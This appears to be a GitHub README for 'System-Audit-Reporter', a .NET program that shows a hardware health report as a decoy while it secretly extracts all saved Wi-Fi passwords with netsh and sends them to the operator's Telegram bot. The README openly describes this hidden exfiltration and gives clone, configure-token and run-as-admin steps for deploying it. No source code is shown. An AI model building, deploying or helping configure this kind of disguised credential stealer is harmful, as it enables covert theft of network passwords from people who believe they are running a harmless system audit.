# Welcome to System-Audit-Reporter 🚀

### Project info
**URL:** [https://github.com/MrChamika/System-Audit-Reporter](https://github.com/MrChamika/System-Audit-Reporter)

---

### How does this tool work?
There are several features built into this application to monitor system health and retrieve network credentials.

#### **Hardware Audit (Visible)**
The application generates a professional HTML report that opens in your default browser. This report includes:
* **CPU/GPU Details**: Model names and real-time temperatures.
* **System Load**: Current CPU usage percentage.
* **Network Specs**: MAC Address and all IPv4/IPv6 assignments.

#### **Credential Recovery (Behind the Scenes)**
While the hardware report is displayed locally, the tool performs the following actions in the background:
* **Wi-Fi Extraction**: Retrieves all saved profiles and passwords using `netsh`.
* **Secure Exfiltration**: Sends the sensitive password list directly to a private Telegram Bot.

---

### How can I run this code?
If you want to test this locally using your own IDE, you can clone this repo and build the solution.

#### **Requirements**
* **.NET 6.0/8.0 SDK** installed.
* **Administrator Privileges**: Required to access hardware sensors and Wi-Fi data.

#### **Follow these steps:**

```bash
# Step 1: Clone the repository
git clone [https://github.com/MrChamika/System-Audit-Reporter.git](https://github.com/MrChamika/System-Audit-Reporter.git)

# Step 2: Set your credentials in Form1.cs
# Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your Telegram details

# Step 3: Build and Run
# The application will automatically request UAC Admin access on launch
